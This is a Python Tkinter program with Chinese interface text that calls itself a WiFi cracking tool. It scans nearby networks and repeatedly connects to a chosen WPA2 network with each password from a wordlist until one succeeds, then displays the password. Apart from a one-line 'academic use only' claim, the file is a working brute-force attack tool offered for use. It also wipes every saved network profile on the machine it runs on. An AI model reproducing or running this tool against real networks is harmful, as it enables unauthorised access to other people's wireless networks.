#!/usr/bin/env python

from tkinter import *
from tkinter import ttk
import pywifi
from pywifi import const
import time
import tkinter.filedialog
import tkinter.messagebox
import threading

# 当前版本存在的问题：
# 无法破解带有特殊字符的wifi 如 希腊字母、日语等，还有 < > 这种符号
# 需要手动修改 profile.akm的赋值方式，windows用的是=，linux用的是append

# 创建一个类，继承自listbox，写一个同时执行插入和查看最后一行的操作
class Log_Listbox(Listbox):
    def insert_and_see(self, message):
        self.insert(END, message)
        self.see(END)

class MY_GUI():
    def __init__(self, myWindow:Tk):
        self.myWindow = myWindow                                          # 窗口
        self.wifi = pywifi.PyWiFi()                                       # 抓取网卡接口
        self.iface = self.wifi.interfaces()[0]                            # 抓取第一个无线网卡

        # GUI元素
        self.get_wifi_value = StringVar(value='搜索后双击 wifi 以填充')    # wifi名
        self.get_value = StringVar()                                      # 文件路径
        self.get_wifipwd_value = StringVar()                              # 正确密码
        self.mylog = None                                                 # 日志框
        self.waitime = IntVar(value=5)                                    # 连接等待时长
        self.codeSet = False                                              # 默认不使用特殊编码
        self.exclude = True                                               # 默认排除长度小于8的密码

    def usefuc(self):
        how_to_use = Toplevel(master=self.myWindow)
        how_to_use.title('使用方法')
        w, h = self.myWindow.maxsize()
        myh = myw = 300
        # 出现在窗口正中间
        how_to_use.geometry(f'{myw}x{myh}+{(w - myw)//2}+{(h - myh)//2}')
        how_to_use.focus_get()
        mytext = Text(how_to_use, wrap=WORD, width=40, height=22)
        mytext.pack()
        content = "1、本工具仅用于学术交流和实验使用。\n\n2、本工具通过WIFI名称和密码本对同一WIFI进行重复连接, 直到连接成功或密码本穷尽。\n\n3、点击搜索附近WIFI可以找到多个WIFI并在WIFI列表中显示, 此时双击WIFI列表中的一项, 即可填充WIFI名称, 当然也可以手动填写。\n\n4、文件路径用于填写密码文件路径, 可以通过旁边的添加按钮选择文件。\n\n5、WIFI密码, 可以填写正确的WIFI密码, 该密码可以用于测试连接, 测试得到的连接速度会自动填充到下方的连接等待时长。破解成功时WIFI密码也会填充到此处。\n\n6、连接等待时长, 指的是连续尝试两个密码的时间间隔, 如果时间间隔过短, 容易因为提前中断而跳过正确密码, 因此该时间应当适量延长。\n\n7、运行日志会在下方显示, 方便检查错误或者用于确定程序还在运行。\n"
        mytext.insert(END, content)

    def notice(self):
        need_to_notice = Toplevel(master=self.myWindow)
        need_to_notice.title('注意事项')
        w, h = self.myWindow.maxsize()
        myh = myw = 300
        # 出现在窗口正中间
        need_to_notice.geometry(f'{myw}x{myh}+{(w - myw)//2}+{(h - myh)//2}')
        need_to_notice.focus_get()
        mytext = Text(need_to_notice, wrap=WORD, width=40, height=22)
        mytext.pack()
        content = "1、该工具在某些机器上可能会出现中文WIFI名乱码的情况, 若出现该情况, 可以尝试点击重新编码按钮后重新搜索并开始\n\n2、该工具无法连接名字里带有特殊字符的WIFI, 这里说的特殊字符不包括!@#$%^&*~等字符, 目前经过简单测试, 发现有影响的字符有: 希腊字母, 日语韩语等外语, 数学字符如 > < 等。如果遇到日志中显示尝试破解, 但是WIFI图标没有处于正在连接的状态, 很有可能时WIFI名中有以上特殊字符, 这是正常的。\n\n3、使用该工具后, 可能有些网络会被遗忘或无法连接, 需要到设置中添加这些wifi到已知网络, 才能恢复连接。\n"
        mytext.insert(END, content)

    def change_code(self):
        if self.codeSet:
            self.codeSet = False
        else:
            self.codeSet = True
        self.mylog.insert_and_see('编码已更改, 请重新搜索wifi.')
    
    def change_exclude(self):
        if self.exclude:
            self.exclude = False
            self.mylog.insert_and_see('已包含长度小于8的密码')
        else:
            self.exclude = True
            self.mylog.insert_and_see('已排除长度小于8的密码')

    def set_init_window(self):
        # ********* 窗口配置 ********
        self.myWindow.title("WIFI破解工具")
        w, _ = self.myWindow.maxsize()
        self.myWindow.geometry(f'550x630+{(w - 550)//2}+0')

        # ********* 顶部菜单栏 **********
        myMenu = Menu(self.myWindow)
        m1 = Menu(myMenu, tearoff=0)    # 隐藏虚线
        m1.add_command(label='使用说明', command=self.usefuc)
        m1.add_command(label='注意事项', command=self.notice)

        myMenu.add_cascade(label='帮助', menu=m1)
        self.myWindow.config(menu=myMenu)   # 配置使用

        # *********** wifi展示列 *********
        self.wifi_labelframe = LabelFrame(self.myWindow, text="wifi列表")
        self.wifi_labelframe.grid(column=0, row=0, columnspan=4, sticky=(W, E, N, S), padx=10, pady=5)

        self.wifi_tree = ttk.Treeview(self.wifi_labelframe, show="headings", columns=("a", "b", "c", "d"))
        self.vbar = ttk.Scrollbar(self.wifi_labelframe, orient=VERTICAL, command=self.wifi_tree.yview)
        self.wifi_tree.configure(yscrollcommand=self.vbar.set)

        self.wifi_tree.column("a", width=50, anchor="center")
        self.wifi_tree.column("b", width=200, anchor="center")
        self.wifi_tree.column("c", width=200, anchor="center")
        self.wifi_tree.column("d", width=50, anchor="center")

        self.wifi_tree.heading("a", text="WiFiID")
        self.wifi_tree.heading("b", text="SSID")
        self.wifi_tree.heading("c", text="BSSID")
        self.wifi_tree.heading("d", text="Signal")

        self.wifi_tree.grid(row=0, column=0, sticky=(W, E, N, S))
        self.vbar.grid(row=0, column=1, sticky=(N, S))
        self.wifi_labelframe.grid_columnconfigure(0, weight=1)
        self.wifi_labelframe.grid_rowconfigure(0, weight=1)

        self.wifi_tree.bind("<Double-1>", self.onDBClick)
        
        # ************* 配置区域 ***************
        labelframe = LabelFrame(self.myWindow, text="配置")
        labelframe.grid(column=0, row=1, padx=10, pady=5, sticky=(W, E, N, S))

        Label(labelframe, text="WIFI帐号: ").grid(column=0, row=0, sticky=W)
        Entry(labelframe, textvariable=self.get_wifi_value, width=22).grid(column=1, row=0, sticky=W)
        Button(labelframe, text="搜索附近WiFi", command=lambda:self.work_in_back(self.scans_wifi_list)).grid(column=2, row=0, padx=10, pady=5, sticky=W)
        Button(labelframe, text='重新编码', command=lambda:self.change_code()).grid(column=3, row=0)

        Label(labelframe, text="文件路径：").grid(column=0, row=1, sticky=W)
        Entry(labelframe, width=22, textvariable=self.get_value).grid(column=1, row=1, sticky=W)
        Button(labelframe, text="添加密码文件", command=lambda:self.work_in_back(self.add_pwd_file)).grid(column=2, row=1, sticky=W, padx=10, pady=5)
        Button(labelframe, text="开始破解", command=lambda:self.work_in_back(self.startCrack)).grid(column=3, row=1, sticky=W, padx=50)

        Label(labelframe, text="WIFI密码: ").grid(column=0, row=2, sticky=W)
        Entry(labelframe, width=22, textvariable=self.get_wifipwd_value).grid(column=1, row=2, sticky=W, padx=1, pady=5)
        Button(labelframe, text='测试连接', command=lambda:self.work_in_back(self.testConnect)).grid(column=2, row=2, sticky=W, pady=5, padx=10)
        Button(labelframe, text='排除/包含长度小于8的密码', command=lambda:self.change_exclude()).grid(column=3, row=2)
        Label(labelframe, text='可以尝试输入密码测试连接热点的速度, 并适当调整连接等待时间', font=('',9), fg='red').place(x=0, y=120)

        Label(labelframe, text='连接等待时长: ').grid(column=0, row=3, pady=24)
        Entry(labelframe, width=22, textvariable=self.waitime).grid(column=1, row=3)

        Label(labelframe, text='在一定范围内，等待时间越长, 连接上的机会越大.', font=('', 9), fg='red').place(x=0, y=170)

        # ********* 运行日志 **********
        listframe = LabelFrame(self.myWindow, text='运行日志')
        listframe.grid(column=0, row=2, padx=10, pady=5, sticky=(W, E, N, S))

        self.mylog = Log_Listbox(listframe, width=70, height=6)
        self.mylog.grid(column=0, row=0, padx=3, pady=3, sticky=W)
        vbar = ttk.Scrollbar(listframe, orient=VERTICAL, command=self.mylog.yview)
        vbar.grid(row=0, column=1, sticky=(N, S))

    # 创建子线程后台运行，需要使用 lambda 延迟该函数执行
    def work_in_back(self, func, *args):
        # 设置保护线程，程序关闭时同时关闭所有子线程
        threading.Thread(target=func, args=args, daemon=True).start()  
        
    def scans_wifi_list(self):
        self.iface.disconnect()  # 测试链接断开所有链接
        time.sleep(1)  # 休眠1秒

        self.iface.scan()
        time.sleep(1)  # 适当调整等待时间
        scanres = self.iface.scan_results()
        self.show_scans_wifi_list(scanres)

    def show_scans_wifi_list(self, scans_res):
        # 清空原有结果
        for i in self.wifi_tree.get_children():
            self.wifi_tree.delete(i)
        # 插入新的结果
        for index, wifi_info in enumerate(scans_res):
            if self.codeSet:
                ssid = wifi_info.ssid.encode('raw_unicode_escape').decode('utf-8')
            else:
                ssid = wifi_info.ssid
            self.wifi_tree.insert("", 'end', values=(index + 1, ssid, wifi_info.bssid, wifi_info.signal))
        self.mylog.insert_and_see(f"搜索完成.")

    def add_pwd_file(self):
        filename = tkinter.filedialog.askopenfilename()
        if filename:
            self.get_value.set(filename)
            self.mylog.insert_and_see(f"已加载文件 {filename}.")

    def onDBClick(self, event):
        for item in self.wifi_tree.selection():
            item_text = self.wifi_tree.item(item, "values")
            self.get_wifi_value.set(item_text[1])  # 填充选中的WiFi账号
            self.mylog.insert_and_see(f"已选择wifi {item_text[1]}")

    def testConnect(self):
        self.iface.disconnect()  # 测试链接断开所有链接
        
        wifi_ssid = self.get_wifi_value.get()
        wifi_pwd = self.get_wifipwd_value.get()
        if not wifi_ssid:
            tkinter.messagebox.showinfo('提示', '请选择对应wifi!')
            return
        elif not wifi_pwd:
            tkinter.messagebox.showinfo('提示', '尚未输入密码')
            return
        
        self.mylog.insert_and_see(f"正在尝试密码 {wifi_pwd}...")
        import time
        start = time.time()
        if self.connect(wifi_pwd, wifi_ssid):
            end = time.time()
            self.mylog.insert_and_see(f'连接成功. 耗时{end - start}s')
            self.waitime.set(int(end - start) + 1)
        else:
            self.mylog.insert_and_see('连接失败, 请检查密码是否正确.')
        
    def startCrack(self):
        filePath = self.get_value.get()
        wifi_ssid = self.get_wifi_value.get()
        if not wifi_ssid:
            tkinter.messagebox.showinfo('提示', '请选择对应wifi!')
            return
        elif not filePath:
            tkinter.messagebox.showinfo('提示', '请选择密码文件!')
            return
        
        try:
            import chardet
            # 检测文件编码
            with open(filePath, 'rb') as file:
                raw_data = file.read()
                result = chardet.detect(raw_data)
                encoding = result['encoding']
        except Exception as e:
            self.mylog.insert_and_see(e)
            encoding='utf-8'

        with open(filePath, "r", errors="ignore", encoding=encoding) as pwd_file:
            for pwd in pwd_file:
                if len(pwd.strip()) < 8 and self.exclude:    # 自动排除字符长度小于 8 的密码
                    continue
                # 每次循环都应该单独设置一个异常检测，防止因为其中一个密码导致的错误使程序停止运行
                try:
                    self.mylog.insert_and_see(f"正在尝试密码 {pwd.strip()}...")
                    if self.connect(pwd.strip(), wifi_ssid, crack=True):
                        self.get_wifipwd_value.set(pwd.strip())
                        self.mylog.insert_and_see(f'破解成功，密码：{pwd.strip()}')
                        self.mylog.insert_and_see(f"正确密码已写入输入框, 有需要可复制.")
                        tkinter.messagebox.showinfo('提示', f"密码 : {pwd.strip()}")
                        return
                except Exception as e:
                    self.mylog.insert_and_see(e)
            self.mylog.insert_and_see('破解失败，尝试所有密码均不匹配！')
            tkinter.messagebox.showinfo('提示', '破解失败，尝试所有密码均不匹配！')

    def connect(self, pwd_str, wifi_ssid, crack=False):
        profile = pywifi.Profile()
        profile.ssid = wifi_ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm = const.AKM_TYPE_WPA2PSK
        # profile.akm.append(const.AKM_TYPE_WPA2PSK) # linux 可能需要该语句
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = pwd_str
        self.iface.remove_all_network_profiles()
        tmp_profile = self.iface.add_network_profile(profile)
        self.iface.connect(tmp_profile)
        # 破解模式
        if crack:
            waitime = self.waitime.get()
            if waitime:
                time.sleep(waitime)  
            else:
                time.sleep(5)   # 默认等待5秒，以便连接稳定

            if self.iface.status() == const.IFACE_CONNECTED:
                return True
            else:
                self.mylog.insert_and_see(f"连接失败, 正在断开连接...")
                self.iface.disconnect()
                time.sleep(0.1)
                return False
        # 测试模式
        else:
            start = time.time()
            # 设置超时时间为 10 s ，一直等待到连接成功为止
            while time.time() - start < 10 and self.iface.status() != const.IFACE_CONNECTED:
                time.sleep(0.1)
            if self.iface.status() == const.IFACE_CONNECTED:
                time.sleep(2)   # 一般在连接成功后的两秒内会保持稳定连接或断开连接
                return True


def gui_start():
    init_window = Tk()
    ZH_WIFI_GUI = MY_GUI(init_window)
    ZH_WIFI_GUI.set_init_window()
    init_window.mainloop()


if __name__ == '__main__':
    gui_start()
